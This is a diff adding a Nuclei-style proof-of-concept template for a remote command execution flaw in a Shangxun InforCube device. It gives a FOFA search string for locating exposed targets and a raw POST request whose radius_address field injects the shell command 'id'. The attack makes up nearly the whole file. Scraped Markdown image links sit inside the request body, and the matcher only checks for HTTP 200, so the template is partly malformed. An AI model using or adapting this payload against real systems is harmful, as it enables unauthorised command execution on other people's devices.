@@ -1,0 +1,30 @@
+id: poc-fpv2onpllt2y50pb
+info:
+  name: 上讯InforCube-StartConfirm存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fpv2onpllt2y50pb'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fpv2onpllt2y50pb
+    fofa: body="default/getloginhtml"
+http:
+- raw:
+  - 'POST /en/9-2radius.php?authority=6 HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Host: {{Hostname}}
+
+
+    save=1&enable_radius=1&radius_address=/'';id;+#+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757220684078-0a587f91-3bd0-4e8b-8a54-adb42f437dca.png)
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757220684267-5b9948f6-5865-4b80-b82a-147241a591af.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
